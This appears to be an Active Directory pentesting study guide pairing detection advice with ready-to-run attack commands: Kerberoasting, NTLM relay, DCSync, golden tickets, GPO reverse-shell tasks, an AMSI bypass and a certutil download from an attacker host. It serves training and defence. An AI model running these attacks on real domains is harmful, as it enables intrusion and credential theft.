1. The Mental Model

Active Directory is the identity and control plane of a Windows enterprise. It stores every user, computer, group, service account, policy, and trust relationship. Compromise the DC and you own the organization.

                    INTERNET
                       │
              VPN / Web / Email
                       │
                INTERNAL NETWORK
                       │
       ┌───────────────┼───────────────┐
       │               │               │
   Employee PCs      Servers        Printers/IoT
       │               │
       └───────────────┼───────────────┘
                       │
                 DOMAIN CONTROLLER
                 ┌─────┴─────┐
                 │  AD DS    │
                 │  DNS      │
                 │  Kerberos │
                 │  LDAP     │
                 │  GPO      │
                 └───────────┘

The attacker does not start at the DC. They start at a workstation, discover the domain, enumerate relationships, and walk the identity graph until they reach a privileged node.

4. DNS — The Hidden Foundation

AD cannot function without DNS. Every DC registers SRV records that clients use to find LDAP, Kerberos, and GC services.

# Find the DC via DNS SRV records
nslookup -type=SRV _ldap._tcp.dc._msdcs.lab.local
nslookup -type=SRV _kerberos._tcp.lab.local
nslookup -type=SRV _gc._tcp.lab.local

# From Linux (useful during pentest)
dig SRV _ldap._tcp.dc._msdcs.lab.local @target-dns
dig ANY lab.local @target-dns
dnsenum lab.local
If you can modify DNS records (e.g., via DHCPv6 + DNS takeover), you can redirect authentication to your machine and capture NTLM hashes. Tool: ntlmrelayx.py + mitm6.

5. Enumeration — Windows Side

Current context

whoami /all
echo %USERDNSDOMAIN%
echo %LOGONSERVER%
nltest /dsgetdc:lab.local

klist sessions                  # Logon sessions

Users & groups

net user /domain
net user alice /domain          # Detailed user info
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net localgroup administrators /domain

Computers

net view /domain
net view /domain:lab.local
nltest /dclist:lab.local
setspn -T lab.local -Q */*      # Enumerate ALL SPNs

PowerShell (AD Module)

# All users with last logon
Get-ADUser -Filter * -Properties Enabled,LastLogonDate,PasswordLastSet,AdminCount,ServicePrincipalName |
  Select SamAccountName,Enabled,LastLogonDate,PasswordLastSet,AdminCount,ServicePrincipalName

# Kerberoastable accounts (have SPN)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
  Select SamAccountName,ServicePrincipalName

# AdminCount=1 users (current or former privileged)
Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount,MemberOf |
  Select SamAccountName,MemberOf

# Computers
Get-ADComputer -Filter * -Properties OperatingSystem,LastLogonDate |
  Select Name,DNSHostName,OperatingSystem,LastLogonDate

# Trusts
Get-ADTrust -Filter * | Select Name,Direction,TrustType
setspn -T lab.local -Q */* is the single most useful enumeration command. It reveals every service account, every server, and every service — all without triggering most detections.

7. Kerberos — Authentication Deep Dive

Normal flow

1. User → KDC:  AS-REQ (username + timestamp encrypted with user's NTLM hash)
2. KDC → User:  AS-REP (TGT encrypted with krbtgt hash)
3. User → KDC:  TGS-REQ (TGT + requested SPN)
4. KDC → User:  TGS-REP (Service ticket encrypted with service account hash)
5. User → Service: AP-REQ (service ticket)
6. Service → User: AP-REP (mutual auth, optional)

Why this matters for attackers

StepAttackWhat you get
AS-REQ/REPAS-REP RoastingOffline crackable hash of pre-auth disabled users
TGS-REQ/REPKerberoastingOffline crackable hash of service accounts
TGTGolden TicketForged TGT with krbtgt hash → unlimited access
TGSSilver TicketForged service ticket → access to specific service
DelegationConstrained/Unconstrained abuseImpersonate users to specific services

8. Kerberoasting

Any authenticated domain user can request a TGS for any service account with an SPN. The TGS is encrypted with the service account's NTLM hash — if the password is weak, you crack it offline.

Step 1: Find targets

# PowerShell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,PasswordLastSet |
  Select SamAccountName,ServicePrincipalName,PasswordLastSet

# Impacket
GetUserSPNs.py lab.local/alice:'Password123' -dc-ip 10.10.10.1 -request

Step 2: Crack

# Hashcat (mode 13100 for TGS-REP)
hashcat -m 13100 hashes.txt rockyou.txt

# John
john --wordlist=rockyou.txt hashes.txt

Step 3: Use cracked credentials

# If svc_backup:Backup2026! was cracked
secretsdump.py LAB/svc_backup:'Backup2026!'@10.10.10.1
Event 4769 — A TGS request was made. Monitor for a single user requesting tickets to many SPNs in a short window. Filter: ServiceName != krbtgt and TicketEncryptionType = 0x17 (RC4).
Target RC4 encryption. Force RC4 by requesting with -rc4opsec flag in Rubeus. RC4 tickets crack 100x faster than AES-256.

9. AS-REP Roasting

Users with DONT_REQUIRE_PREAUTH set allow you to request a TGT without knowing the password. The AS-REP contains the hash encrypted with the user's NTLM hash.

Find targets

# Impacket
GetNPUsers.py lab.local/ -dc-ip 10.10.10.1 -usersfile users.txt -format hashcat -outputfile asrep.txt

# PowerShell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select SamAccountName

Crack

hashcat -m 18200 asrep.txt rockyou.txt
Event 4768 with Pre-Authentication Type = 0 indicates an AS-REP request without pre-auth. This is abnormal and should trigger an alert.

10. NTLM Relay & Capture

NTLM is still present in most environments. If you can capture or relay NTLM authentication, you can impersonate users.

Capture NTLMv2 hashes

# Start Responder on internal network
responder -I eth0 -v

# When a host resolves a name you've poisoned, you get:
[SMB] NTLMv2-SSP Hash: alice::LAB:1122334455667788:AABBCCDD...

# Crack with hashcat
hashcat -m 5600 hash.txt rockyou.txt

Relay to LDAP/SMB

# Disable SMB and HTTP in Responder.conf (relay, not capture)
ntlmrelayx.py -t ldaps://10.10.10.1 --escalate-user bob
# This adds bob to a privileged group via LDAP relay

IPv6 DNS takeover (mitm6)

# Advertise yourself as DNS server via DHCPv6
mitm6 -d lab.local

# Relay the resulting authentication to LDAPS
ntlmrelayx.py -t ldaps://10.10.10.1 -6 --whitelist wk01.lab.local
mitm6 + ntlmrelayx is devastating. Windows prefers IPv6 DNS when available. You become the DNS server, redirect WPAD and authentication, and relay to LDAPS to add your user to Domain Admins. Works on default Windows configs.
Detect mitm6: Monitor DHCPv6 traffic on internal networks. Any DHCPv6 advertisement from a non-approved source is suspicious. Also watch for Event 4768 from unexpected source IPs.

11. ACL Abuse — The Silent Killer

Every AD object has a DACL. Misconfigured ACLs are the most common path to Domain Admin in real environments.

Dangerous permissions

PermissionWhat it allowsAttack
GenericAllFull control over objectReset password, add SPN, modify group membership
GenericWriteWrite most attributesSet servicePrincipalName → Kerberoast
WriteDaclModify the object's DACLGrant yourself GenericAll
WriteOwnerChange object ownerTake ownership → modify DACL
ForceChangePasswordReset user's passwordInstant account takeover
AddMemberAdd members to a groupAdd yourself to Domain Admins
AllowedToDelegateConstrained delegationImpersonate users to target service
WriteProperty (ScriptPath)Set user's logon scriptRCE when user logs in

Find ACL abuse paths with BloodHound

# Custom Cypher query — find GenericAll on users:
MATCH p=shortestPath((n)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner|ForceChangePassword*1..]->(m:User))
WHERE n <> m RETURN p

Abuse GenericAll on a user

# Reset password
net user bob 'Pwned123!' /domain

# Or with PowerView
Set-DomainUserPassword -Identity bob -AccountPassword (ConvertTo-SecureString 'Pwned123!' -AsPlainText -Force)

# Add SPN to user (then Kerberoast)
Set-DomainUser bob -Set @{serviceprincipalname='nonexistent/bob'}
BloodHound's "Shortest Paths to Domain Admins" is the single most valuable query in AD pentesting. Run it first. Every time. The path it reveals is usually 2-3 hops and involves ACL abuse, not credential theft.
Detect ACL abuse: Event 4662 with Properties containing {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All = DCSync). Also monitor for unexpected password resets or group membership changes.

12. DCSync — The Crown Jewel

If your account has DS-Replication-Get-Changes-All on the domain object, you can replicate (pull) all passwords from the DC — just like a real DC would.

# Impacket — dump everything
secretsdump.py LAB/alice:'Password123'@10.10.10.1

# Output includes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f3bc61e97fb14d18e34c8104e0613400:::

# Just krbtgt (for Golden Ticket)
secretsdump.py LAB/alice:'Password123'@10.10.10.1 -just-dc-user krbtgt

# Mimikatz (on DC or with DA creds)
lsadump::dcsync /user:LAB\krbtgt /domain:lab.local
Event 4662 with replication rights is the #1 indicator of DCSync. Create a detection rule: any non-DC machine performing directory replication = compromise.

13. Golden & Silver Tickets

Golden Ticket (krbtgt hash)

Forge a TGT for any user to any service. Valid for 10 years by default. Survives password changes (until krbtgt is rotated twice).

# Impacket
ticketer.py -nthash f3bc61e97fb14d18e34c8104e0613400 -domain-sid S-1-5-21-... -domain lab.local Administrator

# Use the golden ticket
export KRB5CCNAME=Administrator.ccache
psexec.py lab.local/Administrator@dc01.lab.local -k -no-pass

# Mimikatz
kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-... /krbtgt:f3bc61e97fb14d18e34c8104e0613400 /ptt

Silver Ticket (service account hash)

Forge a TGS for a specific service. More targeted but stealthier.

# Forge a CIFS (SMB) ticket for DC01
ticketer.py -nthash <service_hash> -domain-sid S-1-5-21-... -domain lab.local -spn cifs/dc01.lab.local Administrator

# Forge a LDAP ticket (for DCSync without DA)
ticketer.py -nthash <service_hash> -domain-sid S-1-5-21-... -domain lab.local -spn ldap/dc01.lab.local Administrator
Silver tickets for LDAP service on the DC let you DCSync without being Domain Admin. The DC's own LDAP service account is DC01$ — if you have its hash (from secretsdump), you can forge LDAP tickets.
Golden Ticket detection: Event 4768 where the Client Address doesn't match the user's normal workstation. Also: TGT lifetime > 10 hours, or TGT encryption type downgraded to RC4.

14. Delegation Abuse

TypeHow it worksAttack
UnconstrainedServer can impersonate ANY user to ANY serviceCompromise server → impersonate Domain Admin
ConstrainedServer can impersonate users to SPECIFIC servicesIf Protocol Transition is enabled, still dangerous
Resource-Based (RBCD)Target specifies who can delegate to itIf you can write msDS-AllowedToActOnBehalfOfOtherIdentity, you can delegate

RBCD attack (if you have GenericWrite on a computer)

# Add your controlled computer as allowed delegate
Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount ATTACKER$

# Or from Linux with impacket
rbcd.py -delegate-from ATTACKER$ -delegate-to TARGET$ -action write -dc-ip 10.10.10.1 LAB/alice:'Password123'

# Get a ticket as Domain Admin to TARGET
getST.py -spn cifs/target.lab.local -impersonate Administrator lab.local/attacker\$:'MachinePass' -dc-ip 10.10.10.1
RBCD is the modern escalation path. If you compromise any domain-joined machine (even a workstation), you can set RBCD on a server and impersonate DA. No credentials needed beyond the machine account hash (which is in LSA secrets).

16. GPO Abuse

If you can edit a GPO, you can push code to every machine the GPO applies to.

Find modifiable GPOs

# PowerView
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" }

Abuse with SharpGPOAbuse

# Add a local admin to all computers in the GPO scope
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob --GPOName "Workstation-Lockout"

# Add a scheduled task (reverse shell)
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Command "cmd.exe" --Arguments "/c powershell -enc <base64>" --GPOName "Workstation-Lockout"
Event 5136 — Directory object modified. Watch for GPO modifications, especially gPCFileSysPath changes or new scheduled tasks in GPO XML files.

Honey tokens

Deploy these detection traps:
  • Honey user — Create a fake DA account with no real activity. Any logon = compromise.
  • Honey SPN — Register an SPN on a fake account. Any TGS request = Kerberoasting.
  • Honey share — Create a file share with a Canary token. Any access = lateral movement.
  • Honey GPO — Create a GPO that's never applied. Any modification = GPO abuse.

19. BloodHound Cheat Sheet

Essential Cypher queries

# Shortest path to Domain Admins
MATCH p=shortestPath((n)-[*1..]->(m:Group {name:"DOMAIN ADMINS@LAB.LOCAL"})) RETURN p

# All Kerberoastable users
MATCH (n:User) WHERE n.hasspn=true RETURN n.name,n.serviceprincipalnames

# Users with DCSync rights
MATCH p=(n)-[:GetChangesAll]->(d:Domain) RETURN p

# Find computers where Domain Users are local admin
MATCH p=(g:Group {name:"DOMAIN USERS@LAB.LOCAL"})-[:AdminTo]->(c:Computer) RETURN p

# Find users who can reset other users' passwords
MATCH p=(n:User)-[:ForceChangePassword]->(m:User) RETURN p

# Find all computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

# Find computers with LAPS (defensive check)
MATCH (c:Computer) WHERE c.haslaps=true RETURN c.name
Custom queries to save: "Kerberoastable with AdminCount=1" (high-value targets), "Users with PasswordNeverExpires" (weak accounts), "Computers with unconstrained delegation" (escalation targets).

22. Full Scenario — Zero to Domain Compromise

Scenario: Compromising CORP.LOCAL

Composite scenario based on real-world patterns. Target: CORP.LOCAL, DC at 10.10.10.1. You have a low-privilege shell on WK01 as user analyst.

Step 1 — Situational Awareness 
C:\> whoami /all
User: CORP\analyst
Groups: Domain Users, SOC
Privileges: SeChangeNotifyPrivilege

C:\> echo %LOGONSERVER%
\\DC01

C:\> ipconfig /all
DNS: 10.10.10.1
Domain: corp.local

You're analyst in the SOC group. Low privileges. No local admin. Now discover the domain.

Step 2 — Domain Enumeration 
C:\> net group "Domain Admins" /domain
Members: admin_da, Administrator

C:\> net user /domain
alice, bob, analyst, svc_backup, admin_da, Administrator, svc_sql

C:\> setspn -T corp.local -Q */*
CN=svc_sql,OU=Service Accounts,DC=corp,DC=local
  MSSQLSvc/srv01.corp.local:1433
CN=svc_backup,OU=Service Accounts,DC=corp,DC=local
  backup/srv01.corp.local

Finding: svc_sql and svc_backup have SPNs — Kerberoastable targets.

Step 3 — BloodHound Collection 
# From your attack box (Linux)
bloodhound-python -d corp.local -u analyst -p 'Analyst2026!' -ns 10.10.10.1 -c All --zip

# Import into BloodHound GUI, run "Shortest Paths to Domain Admins"
# Result: analyst → SOC group → GenericWrite on svc_sql → Kerberoast → DA

BloodHound reveals: The SOC group has GenericWrite on svc_sql.

23. Tips & Tricks Compilation

Enumeration

Always run setspn -Q */* first. It reveals every service account and server without triggering most detections. More useful than net user /domain for finding attack paths.
Check AdminCount=1 users. Current or former privileged accounts. Often overlooked by admins after role changes. Get-ADUser -Filter {AdminCount -eq 1}
Look for msDS-AllowedToDelegateTo. Constrained delegation + Protocol Transition = impersonate any user to that service.

Credentials

Check SYSVOL for passwords. Admins store creds in GPO scripts, XML files, scheduled tasks. findstr /S /I "password" \\corp.local\SYSVOL\*.xml
Check Group Policy Preferences. GPP cpassword fields are decryptable with a published key. Tool: gpp-decrypt.
LSASS memory dump. If you have local admin: procdump -accepteula -ma lsass.exe lsass.dmp then pypykatz lsa minidump lsass.dmp.

Evasion

Use evil-winrm over PsExec. PsExec drops a service binary. Evil-WinRM uses WinRM (built-in) and leaves no artifacts.
AMSI bypass for PowerShell. [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Use certutil for file transfer. certutil -urlcache -split -f http://ATTACKER/tool.exe C:\temp\tool.exe

Stealth

Use getTGT.py instead of Pass-the-Hash. Overpass-the-Hash (NTLM → Kerberos) is stealthier because it uses Kerberos (expected) instead of NTLM (suspicious).
Time your attacks. Kerberoast during business hours (normal TGS volume). DCSync at night (less monitoring). Password spray on Friday afternoon.

Defensive

Deploy LAPS. Local Administrator Password Solution ensures every machine has a unique, random local admin password. Without it, one cracked local admin = lateral movement to every machine.
Disable NTLM where possible. Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value 2
Monitor Event 4662. This single event catches DCSync, ACL modifications, and object changes. Create a SIEM rule for replication rights on non-DC machines.
Honey SPNs. Register an SPN on a fake service account. Any TGS request (Event 4769) for that SPN = Kerberoasting in progress. Zero false positives.

24. Study Path

  1. Build the lab (§2) — DC + 2 workstations + 1 server. Create users, groups, OUs, GPOs.
  2. Enumerate (§5-6) — Run every command. Understand what each reveals.
  3. Kerberos (§7-9) — Learn the flow. Kerberoast. AS-REP Roast. Crack hashes.
  4. NTLM (§10) — Responder + ntlmrelayx. Understand relay vs capture.
  5. ACL abuse (§11) — Find GenericAll, WriteDacl, ForceChangePassword in BloodHound. Exploit them.
  6. DCSync (§12) — Get krbtgt hash. Forge Golden Ticket.
  7. Lateral movement (§15) — PsExec, WMI, WinRM, Pass-the-Hash.
  8. GPO abuse (§16) — Modify a GPO. Push code to all machines in scope.
  9. Delegation (§14) — Set up constrained delegation. Abuse RBCD.
  10. Detection (§18) — Set up Sysmon + Windows Event Forwarding. Detect every attack you just performed.
